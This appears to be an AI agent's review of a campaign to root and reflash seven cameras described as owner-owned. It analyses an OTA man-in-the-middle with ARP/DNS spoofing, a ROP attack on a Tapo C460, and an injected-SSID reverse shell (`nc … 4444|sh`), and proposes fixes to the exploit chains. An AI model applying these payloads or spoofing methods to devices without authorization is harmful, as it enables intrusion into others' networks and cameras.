# OMP Review — Camera Liberation Root-Shell Plan (2nd pass)

**Reviewer:** omp agent, 2026-11-07 00:3x EST · **Method:** `modes-of-reasoning-project-analysis` operators applied sequentially by one agent (skill §Read Order permits this). Every mode is a bounded operator on one pivotal question; overreach and nulls are stated. **Ground truth measured live this session:** `/var/lib/fss-telemetry/sweeper-c460.jsonl` (12,664→12,680 events while I worked — watcher still live, span 2026-11-03T12:23Z→now), `/tmp/ota/broker.log` (401k+ lines), `/tmp/ota/forge.log`, `/tmp/c460_fire.log`, `deliverables/fleet/owlet-h1-en1-session.pcap` (42 packets), the live ARP/route/socket tables, and `bash deliverables/scripts/wyze_flash_readiness.sh` (executed: 0 failures). Anything not directly measured is **[INFERENCE]**.

**Relation to the prior review:** the 2026-11-06 review (committed `c2753bf8`) made two recommendations that were **already implemented at 00:11 tonight** — commit `7529fac3` ("power-cycle readiness asserts + instrumented-fire classification", per its own message "per OMP review D2/P2"). This pass therefore (a) verifies those landed, (b) attacks what they did not fix, and (c) re-ranks the consensus items against tonight's live state.

**Decision contract:** which consensus items to execute, cut, or re-gate, given 7 owner-owned cameras and scarce operator hands. Loss function: **false readiness** — executing a step whose prerequisites silently regressed, burning the scarcest resources (owner visit, power cycles, the single Wyze canary flash).

**Plan text under attack** (verbatim from the author's context block):
> "Wyze .39/.51: OTA MITM chain armed, camera pulls OUR capsule, shadow delta versioning live (v1312), 22 accepted-rewrites — blocker is the camera's own OTA cadence + a power-cycle to reset backoff."
> "Tapo C460: ROP ret2stack armed, fires on PIR wake; boot-address window is statistical (579 wakes, 1 fire, no shell)."
> "Thingino target firmware extracted and verified (full ONVIF+RTSP post-flash, no vendor creds needed)."
> "Tapo C660: off-LAN after factory reset, ROP watch armed … Owlet: DTLS completes but vendor gate withholds 0x2041 … H1 = capture live app session (pcap infra running). Yi: SSID-injection staged, needs setup-mode. AOSU: Tuya registration burned; golden-vector signer proven; needs fresh Tuya account."

Consensus items are the 5 merged winners in `DUELING_WIZARDS_REPORT.md` §Consensus winners.

---

## 1. SYMBOLIC — deterministic vs judgment; certainty the plan doesn't have

**Pivotal question:** which steps are assertable end-to-end today, and where does the plan state as fact something no evidence path supports?

### Mechanical (assertable today — some already asserted)

| Step | Assert | Status this session |
|---|---|---|
| Power-cycle readiness | `wyze_flash_readiness.sh` A1–A7 (broker :8883, REWRITE=1, OTA_MD5≡capsule, pf rdr .39+.51, receivers 444–449, chain-watch alive, forge byte-verify) | **Ran it: 0 failures** (7529fac3) |
| Capsule integrity | md5 `ef2d38a3…` pinned in broker env; `md5 -q` of `/tmp/fwserve/…/4.52.17.99.tar` matches | verified live |
| AOSU entitlement diagnostic | `aosu_cloud.py` login/devices/`thing.m.device.key.get`; assert = `local_key` in response | scripted, smoke-tested; **not yet run against a live account** |
| Owlet capture coverage | pcap must contain phone↔camera unicast before the app opens | **now measurable — and it currently fails** (see §3 D4) |
| Write order | dry-run: 6 partitions, uboot last, 13.5 MiB map refused (`FLEET_LIBERATION_STATUS.md` §22:213) | dry-run was against a fake `/proc/mtd`; first real run is the first real run |

### Judgment-bearing (not fully scriptable)

1. **The armed capsule pre-commits the sensor guess the runbook forbids.** `FLASH-DAY-RUNBOOK.md` §0.2: both units' sensor reads are "**PENDING — read post-root**", the variant is "NOT decidable host-side" (`wyze_flash_preflight.sh:290`), and a wrong pick "boots blind … burns a power cycle" (§0.2 table + `:75`). Yet the **armed** capsule's `upgraderun.sh` has `SENSOR="os04d10"` baked by `build_ota_tar.py --render`, and the armed image is the **Oct-24 tailnet build** (`FINISH-WYZE.md:189`, sha256 `033eb364…` = `deliverables/firmware/thingino-wyze_cam4_t41nq_os04d10_atbm6062s-tailnet.bin`, byte-verified by me against the staged `/tmp/fwserve/img.bin`). So "Thingino target firmware extracted and verified" is true of the *Oct-23 downloaded reference images* (`~/fss-exploit/fw/thingino_{gc4653,os04d10}.bin`, both PASS the checker) and **false of the image actually armed**. Measured:
   ```
   == /tmp/fwserve/img.bin
     FAIL chip-header byte @0x9 = 0x0d, not a known variant
   verdict: FAIL (0/1 images)
   ```
   The verifier's variant map (`verify_thingino_image.py:23` `VARIANTS = {0x40: "gc4653", 0x52: "os04d10"}`) was calibrated on the vendor-lineage downloads; the from-source build bakes `0x0d`. The runbook's own gate ("Every assertion must print OK", committed reference outputs from the *other* images) cannot pass against the armed artifact. This is exactly the "verified describes the artifact, not the per-unit fit" trap — now one level deeper: the project's own verifier rejects the project's own armed flash image, and nothing in the plan notices.
2. **The "visible-event" acceptance predicate is still judgment, not code.** Duel finalist 5: "a stale/frozen image must not satisfy the predicate." No mechanical definition (≥N frames, inter-frame delta above threshold, within T of RTSP connect) exists anywhere in the repo. Undefined on flash day, acceptance silently degrades to "a frame arrived."
3. **Yi's "needs setup-mode" compresses a GUI ritual with a metacharacter SSID.** `FLEET_LIBERATION_STATUS.md:121`: macOS Internet Sharing "cannot be brought up headlessly… `kickstart` is SIP-refused and the GUI toggle rewrites the SSID"; payload SSID `x$(nc 192.168.4.160 4444|sh)` — 28 octets of `$ ( |` that must survive verbatim. The repo already carries the escape hatch (`docs/exploit/yi-runbook.md` Addendum 2: $25–40 travel router, GL.iNet/OpenWrt preserves the SSID byte-for-byte; AP-hosted variant `x$(nc 192.168.60.1 4444|sh)` already staged). The plan should adopt the travel-router path, not the macOS AP toggle, in the owner session.

### Certainty the plan doesn't have

**"Camera pulls OUR capsule" — measured FALSE tonight.** All 36 `GET /wuv2/upgrade/HL_CAM4/firmware/4.52.17.99.tar` hits in `forge.log` are self-tests (`127.0.0.1`, `192.168.4.160/.46`, ua `curl/8.7.1`). Zero camera-sourced capsule fetches, ever. What IS camera-sourced: 115 (.39) + 104 (.51) component GETs on the 50199 chain, and 429 MQTT CONNECTs with 323 armed-delta injections and exactly **22 accepted-rewrites** (4× `.32`-era, 18× `.99`-era — the count is real, I recounted). "v1312" is real too (delta versions 1308→1312 in `broker.log`). But the dispatch-failures table (`FLEET_LIBERATION_STATUS.md:126`, five entries) plus §32's "the device consumes shadow deltas and accepts `run_action` … but issues no GET" mean: **ACK ≠ act**. "Blocker is the camera's own OTA cadence + a power-cycle" hides three measured, live defects on the critical path — see §3 D2 and §4.

**"Boot-address window is statistical" — category error, and the telemetry's key field is an artifact.** The 585/585 constant `boot_addr=0xbef8b000` is parsed by `sweeper_telemetry.py:86` from the watcher's own log line "watching for … fire 0xbef8b000" — it records the **config constant**, not an observation of the camera. The *actual* boot-address observations live in `/tmp/c460_fire.log`: **two HANG hits at two different addresses** — `0xbef8ec00` (recovered 0.7 s, 11-04) and `0xbef8c000` (recovered 5.0 s, 11-06) — i.e., the boot address **varies across boots** and the sweep has *already re-derived it twice*. What happened to those derivations is the damning part: the HANG branch (`c460_fire.sh:145`) does `rm -f "$STATE"; exec self` — which restarts with `ADDR` defaulting **back to 0xbef8b000**, because the designated persistence hook `/tmp/c460_root_addr.txt` (`c460_fire.sh:28`) **has no writer anywhere in the repo** (grepped all of `deliverables/`, `tools/`). Both re-derived addresses were thrown away.

**"579 wakes, 1 fire" doesn't decompose.** Real counters: `present=636`, `fire=581` (all `gap_s=3` — that's the script's `GUARD_GAP` constant, not a measured readiness window; 579 watcher fires + 2 burst-daemon fires), `rop_result=574` all `no-hang`, 16 absent. Roughly 10 true boots (absent>60 s) vs ~58 fires per boot, with only 4 "already fired" gate hits against 641 "watching for" lines — the per-boot one-shot invariant is not what's running: the state file in `/tmp` is being wiped between runs (only the HANG branch removes it in-script; the `/tmp` auto-clean pressure noted in AGENTS.md is the likely eraser **[INFERENCE]**). The plan's arithmetic is wrong in the direction of *understating* how hard the sweeper hammers one possibly-wrong offset.

---

## 2. NEURAL — what the 12,680-event pattern says that the plan ignores

**Pivotal question:** what pattern changes the C460 approach?

Measured facts (jsonl, this session):

| Quantity | Value |
|---|---|
| events | 12,680 (11-03 12:23Z → live; watcher still appending) |
| present / fire / rop_result | 636 / 581 / 574 (all `no-hang`) |
| `gap_s` on fires | 3 — constant (script `GUARD_GAP`) |
| inter-present (post-11-05) | median **2.4 min** |
| fires by hour | every hour; peak 03–05h (35/38/34) |
| login_attempt | 10,286 = **81.1%** of all events |
| HANG hits (fire log) | 2, at **0xbef8ec00** and **0xbef8c000** — both discarded |

**P1 — Opportunity is saturated; timing is not the constraint.** A wake every ~2.4 min with fires in every hour (peak at 03–05h, when no human is walking past **[INFERENCE: wake cause is not tagged in the schema]**) means the PIR-wake window was never the bottleneck. The 03–05h peak suggests background/heartbeat wakes — the C460 wakes itself; nobody needs to walk past it, and nobody needed to at any point in this campaign.

**P2 — The real signal is the two HANG hits, and the pipeline mangled it.** A hang is a positive oracle: the payload's PC landed in the sled at that boot's stack address. Two hits at *different* addresses across boots is exactly the cross-boot variance the plan calls "statistical" — but the correct response is per-boot derivation and persistence (the designed mechanism, `c460_root_addr.txt`), which is a dead hook. The plan doesn't exploit the one positive signal the system has ever produced. Since 00:11 the fires are instrumented (`latency_s`, outcome signature — 7529fac3), which fixes the *classifier* half; the *persistence* half is still broken, so the next hang hit will be thrown away too.

**P3 — 81% of telemetry is a closed-prior lane.** 10,286 `login_attempt` events feed the DS brute force the repo already closed: ~24.2 M candidates, rockyou exhausted in 7 s, verdict "the value is random or non-obvious" (`FLEET_LIBERATION_STATUS.md` §Tapo oracle). Kill or cap it; the budget belongs to instrumented fires and the sstarXZ decode (`tapo_lzma2.py` desync at byte 299 — the actual root-blocker chain, step 1, `HANDOFF-CAMERA-LIBERATION.md`).

---

## 3. DEEP — second-order effects the plan misses

**Pivotal question:** what breaks *elsewhere*, or *later*, when one camera flashes?

**D1 — en1 is Wi-Fi. Measured, no longer inference.** `system_profiler`: en1 = AirPort, `type: Wi-Fi`, MAC `82:0f:80:f6:d4:43` (randomized per boot). Every plane — ARP/DNS spoof for .39/.51 (`deliverables/watchers/caplets/spoof.cap`), broker TLS, forge 443/8443, beacon 8080, receivers 444–449, TFTP, C460 pollers — rides one wireless NIC. Flash day adds ~16 MiB image fetch + 6 partition backups (~16 MiB up) *over Wi-Fi* while bootwatch wants tight polling and the C460 watcher wants 1–5 s ARP/ICMP cadence. **[INFERENCE]**: image+backup streaming plausibly degrades exactly the latency-sensitive windows the same transaction depends on. The mitigation is boring and cheap: flash the canary when no other lane is mid-transfer, and pin the C660 route (see D6) before, not during.

**D2 — The boot-time race is half-armed, and one armed vector points at a dead tunnel.** The live state is the best it has ever been: `.51` holds an ESTABLISHED :8883 session to our broker right now; rewrites fire on every shadow get/accepted; A1–A7 pass. But measured tonight, inside the *armed* shadow the camera actually receives:
- `wyze-service get/accepted`: `url` = our `.99.tar` ✓ (rewritten)
- `wyze-secure get/accepted`: `APPPushOTA` arrives as an **escaped JSON string** `"APPPushOTA":"{\"url\": \"https://wider-key-volleyball-addressed.trycloudflare.com/firmware.bin?v=21\"}"` — and the rewriter (`wyze_mqtt_mitm.py:64-70`) only rewrites `APPPushOTA` when `isinstance(des["APPPushOTA"], dict)`. The string form passes through untouched. `curl -sI` on that tunnel: **exit 6, DNS fail — dead.** (The mitm's own comment says both old hosts — trycloudflare, ota.frankenfs.com — are dead, yet the live shadow still advertises one of them in the one form the rewriter skips.)
  If `assis`'s state machine reads the string-form `APPPushOTA` from `wyze-secure` (unknown — nobody has established which field it consumes), the power cycle buys it a dead URL and **defect #6 is pre-installed**. Fix is three agent-side lines (json.loads the string, rewrite, re-dump) *before* any power cycle; the readiness asserts don't cover it.
- Also live: `inject cmd retry OSError(9, 'Bad file descriptor')` and `tls fail` storms in `broker.log` — the broker has known-active defect patterns precisely at the moment the transaction needs it clean (3,722 EADDRINUSE bind failures, PEM races: `FLEET_LIBERATION_STATUS.md:491`, §02:55).

**D3 — The failure branch has no owner.** If the canary write fails mid-way, the recovery path needs: re-verify armed negative (keepfresh is currently *not running* — measured; nothing re-publishes the negative after a boot), re-arm rewrite, re-check A1–A7. `FLEET_LIBERATION_STATUS.md:378`: keepfresh "must be stopped before publishing the capsule or it will revert the shadow" — but nothing restarts it after a *failed* flash, and nothing re-publishes the negative. Write the recovery branch before flash day.

**D4 — The Owlet H1 capture point is structurally blind. Measured.** `owlet-h1-en1-session.pcap` (42 packets, 22:49–23:27 tonight): every frame is `82:0f:80:f6:d4:43` (the Mac) ↔ `38:01:46:ab:83:8a` (Owlet). **Zero phone packets.** en1 is a Wi-Fi *station* in infrastructure mode — it sees only its own unicast plus broadcasts; phone↔camera unicast never traverses it. The duel report's codex critique said this would happen; the pcap now proves it: the staged capture point cannot see the app session it exists to capture, so "H1 = capture live app session (pcap infra running)" is **false readiness**. Fix before the owner visit: route the phone through the Mac (Wi-Fi proxy/ICS) or bridge, or capture on a path the phone↔camera traffic actually crosses. Absence in the current capture proves nothing — the repo's own not_observable discipline says so.

**D5 — Post-flash identity.** Liveness = `arp -an` by MAC, never ping (Eero proxy-answers ICMP — `FLEET_LIBERATION_STATUS.md:24`; I re-confirmed the pattern: Owlet answers ping at 205 ms while ARP-resolvable; AOSU at 31 ms). Acceptance must assert MAC before the RTSP predicate; `dhcp-reservations.md` exists for this.

**D6 — The census/route plumbing is silently degraded tonight.** Measured live: (a) `registry.py` reads `/tmp/fleet_arp_snapshot.txt`, which was **zero bytes, wrong format, 10 h stale** — `fleet_status.py` consequently misreported every camera until I refreshed it with `sudo arp -an`; the staleness printout goes to stderr only. The plan's gates consume this census. (b) The only pinned host route is `192.168.4.92 → en0` — the **wrong interface** by the repo's own rule ("all camera-facing tools MUST use `--interface en1` or the traffic goes out en0 and dies", `HANDOFF-CAMERA-LIBERATION.md`); no pinned routes exist for .33/.39/.51/.163/.20. (c) The AOSU registry primary MAC (`60:d5:61:21:4d:36`) is not the device's ARP MAC (`78:28:ca:92:21:dc` at .86, measured) — `registry.py resolve aosu` fails while the device is on-LAN. Any of these three silently poisons flash-day asserts that "resolve by MAC."

**D7 — Owlet needs one visit item the plan already knows but under-weights:** the vendor DTLS gate is broken for *everyone including the vendor app* (AV_ER_TIMEOUT via Frida-verified `avClientStartEx`), H3/H4/H5 closed-negative (verbatim replay, boot-window, pacing — ledger), H1 open. The owner-session capture (D4 fixed) is the only remaining H1 evidence source. Order it **before** any step that mutates host networking (Yi AP toggle last — it rewrites macOS config and degrades all simultaneous gates).

---

## 4. FAST — the single cheapest uncertainty-killer

**The 5-second power cycle of .51 (or .39), tonight, after two 3-line agent-side fixes.** The A1–A7 asserts pass *right now* (I ran them); the readiness work is done; the power cycle is the first end-to-end experiment on the plan's critical path and converts "armed" into either *consumed* (chain proven; flash transaction starts) or *defect #6 found* — both outcomes dominate everything else available at any price.

But do the two cheap fixes **first**, or the cycle may be wasted:
1. **APPPushOTA string-form rewrite** (`wyze_mqtt_mitm.py:68`): json-parse the escaped string, rewrite its url/md5, re-dump — kills the dead-tunnel vector (§3 D2) for ~3 lines.
2. **Persist hang-derived addresses** (`c460_fire.sh` HANG branch): write the swept address to `/tmp/c460_root_addr.txt` before `exec` self-restart — the file is read (`:28`) but never written by anything; the next HANG hit currently evaporates.

Parallel free action (agent-side, zero operator): the **AOSU entitlement diagnostic** — scripted, smoke-tested, decides the 5-device lane. Note its prerequisite drift: the setup-mode window that made the lane hot (beacons at .126, `FLEET_LIBERATION_STATUS.md` §17:45) has **expired** — AOSU at .86 now answers ARP+ICMP with all probed TCP closed and no :6667 beacons (12 s capture tonight). The diagnostic can run against the *account*, but the *device* lane needs a fresh reset/re-provision — an owner-session item the context block's "needs fresh Tuya account" understates.

---

## 5. VERDICT — rank the 5 consensus items; cut list

Score = certainty of success × cameras-unlocked ÷ operator time. Certainties are my judgments from tonight's evidence, stated so you can argue the number, not the vibe.

| Rank | Item | Certainty | Cameras | Op time | Ratio | Verdict |
|---|---|---|---|---|---|---|
| 1 | **AOSU entitlement diagnostic before signer work** | 0.95 (mechanical; client smoke-tested) | 5 (H2E fronts 4 SolarCams) | ~0 | **highest** | GO now, agent-side; device lane needs fresh reset in the owner session |
| 2 | **Prepared owner session** | 0.80 — *after* D4 capture-point fix + D6 census/route repair + AOSU reset re-trigger added | 4–5 | 30–60 min | high | GO, ordered: passive captures → MITM-dependent → config-mutating AP toggle last |
| 3 | **Power-cycle experiment (gate for #4, not a consensus item)** | 0.85 with A1–A7 green + the two §4 fixes | 2 | 5 s | very high | GO tonight |
| 4 | **Wyze canary flash transaction** | **0.65** (down from any prior 0.75+: armed image FAILS the project's own verifier; `SENSOR="os04d10"` baked while both reads are PENDING; chain never once consumed end-to-end) | 2 (+dissolves RTSP-creds blocker) | 1–2 h watch | medium | CONDITIONAL GO — gated on: verifier updated for the tailnet build (or capsule re-armed from a checker-PASSING image), sensor-variant risk accepted in writing (recoverable, not a brick, `flash-plan.md` §Risks) |
| 5 | **First-footage auto-acceptance** | 0.60 (predicate still undefined in code) | all post-flash | low | medium | GO — write the mechanical predicate (≥N frames, inter-frame delta > θ, ≤T s of connect, test card) *before* flash day |
| 6 | **Minimal wake-window scheduler** | 0.25 (windows saturated — §2 P1; fires/boot ≈58 already) | 1 | dev hours | **lowest** | **CUT** |

**CUT item 6 and replace it with the two-line persistence fix.** The duel's "replay 12.6k events → predict next wake window" premise died on contact with the data: median inter-wake 2.4 min, fires every hour, fires already outnumber boots ~58:1. What the telemetry actually motivates is not *when* to fire but *where*: persist the hang-derived address per boot (§2 P2), let the instrumented fires (live since 00:11) stratify outcomes by time-since-wake, and route the saved budget from the dead login-brute lane (81.1% of telemetry) into the sstarXZ decode — the C460's real root-blocker chain step 1.

**Rejected tempting claims** (checked and dropped during this pass, per skill discipline):
- "The tailnet image is corrupt" — no; it's byte-identical to the committed build (`033eb364…`). The *verifier's variant table* is stale for from-source builds; the discrepancy is a gate-coverage hole, not image corruption.
- "Raw-string absence proves the tailnet rootfs lacks sensor drivers" — squashfs compresses both reference and tailnet images; raw-string counts are zero in both. Dropped as unprovable this way.
- "Boot address is fixed at 0xbef8b000" — contradicted by two HANG hits at different addresses; the 585/585 constant is a telemetry-regex artifact (config echo).
- "One shot per boot is holding" — 4 gate hits vs 641 watcher starts says otherwise; the state file in `/tmp` doesn't survive between runs.
- "keepfresh currently running" — not running (measured); the *gap* is that nothing re-publishes the negative after a failed flash (D3).

**What would change this review:** a camera-sourced `GET /wuv2/…/4.52.17.99.tar` in `forge.log` (upgrades "armed" to "consumed", raises #4 to ~0.8); a third HANG hit at yet another address (confirms per-boot derivation as the core mechanism, not timing); `assis` observed consuming the string-form `APPPushOTA` (promotes §3 D2 to a blocking defect); en1 confirmed Ethernet (collapses D1); a sensor-variant read for either unit (raises #4 to ~0.85).

**Provenance:** all telemetry numbers recomputed from the jsonl this session; broker/forge/fire-log counts from live `grep -c` passes; A1–A7 executed with output shown in §1; the two §4 fixes are uncommitted suggestions — nothing outside this file and the ARP snapshot was modified.
